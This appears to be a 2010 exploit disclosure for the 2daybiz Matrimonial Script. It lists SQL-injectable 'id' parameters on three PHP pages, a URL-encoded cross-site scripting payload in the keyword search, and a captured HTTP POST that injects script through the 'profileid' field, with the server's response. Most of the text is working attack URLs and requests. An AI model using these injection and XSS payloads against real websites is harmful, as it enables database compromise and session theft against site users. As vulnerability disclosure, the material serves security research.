@@ -1,0 +1,77 @@
+$-------------------------------------------------------------------------------------------------------------------
+$ 2daybiz Matrimonial Script SQL Injection and Cross Site Scripting
+Vulnerabilities
+$ Author : Sangteamtham
+$ Home : Hcegroup.net
+$ Download : http://www.2daybiz.com/matrimonial_script.html
+$ Date :06/25/2010
+$
+$******************************************************************************************
+$Exploit:
+$
+$ 1.SQL injection:
+$
+$ http://server/customprofile.php?id=[id number][SQL]
+$ http://server/success_story.php?id=[id number][SQL]
+$ http://server/year2005.php?id=[id number][SQL]
+$
+$ 2.XSS
+$ 2.1.keyword search:
+$
+$
+$
+http://www.server/products/shaadi/keywordresult.php?lookingfor=&photo=1&maritalstatus=&agefrom=20&ageto=25&heightfrom=&heightto=&community=&mother=&caste=&country=&state1=&city1=&keyword=[XSShere]&Search=Search
+$ Demo:
+$
+http://www.server.com/products/shaadi/keywordresult.php?lookingfor=&photo=1&maritalstatus=&agefrom=20&ageto=25&heightfrom=&heightto=&community=&mother=&caste=&country=&state1=&city1=&keyword=%22%3E%3Cscript%3Ealert%28%22XSS%20Vulnerability%22%29%3C%2Fscript%3E&Search=Search
+$
+$
+$ 2.2.ProfileID search
+Here is my sample header:
+
+$----------------------------------------------------------SAMPLE
+HEADER---------------------------------------------------------
+http://www.server.com/products/shaadi/submit_story.php
+
+POST /products/shaadi/submit_story.php HTTP/1.1
+Host: www.server.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.4)
+Gecko/20100611 Firefox/3.6.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Referer: http://www.server.com/products/shaadi/submit_story.php
+Cookie: __utma=229131423.947861364.1277393768.1277478668.1277481807.7;
+__utmz=229131423.1277393768.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none);
+PHPSESSID=c10e1491d7b9e1d9ed7afc8ce05b7f91; __utmc=229131423;
+acopendivids=nada; acgroupswithpersist=pets,pets,pets
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 221
+profileid=%22%3E%3Cscript%3Ealert%28String.fromCharCode%2883%2C+97%2C+110%2C+103%2C+116%2C+101%2C+97%2C+109%2C+116%2C+104%2C+97%2C+109%2C+32%2C+119%2C+97%2C+115%2C+32%2C+104%2C+101%2C+114%2C+101%29%29%3C%2Fscript%3E&Go=Go
+HTTP/1.1 302 Moved Temporarily
+Date: Fri, 25 Jun 2010 03:11:50 GMT
+Server: Apache mod_auth_passthrough/2.1 mod_bwlimited/1.4
+FrontPage/5.0.2.2635
+X-Powered-By: PHP/5.2.11
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Location: alert.php?id=">
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+$-------------------------------------------------------------END
+HEADER--------------------------------------------------------
+$
+$
+$******************************************************************************************
+$ Greetz to: All Vietnamese hackers and Hackers out there researching for
+more security
+$
+$
+$--------------------------------------------------------------------------------------------------------------------
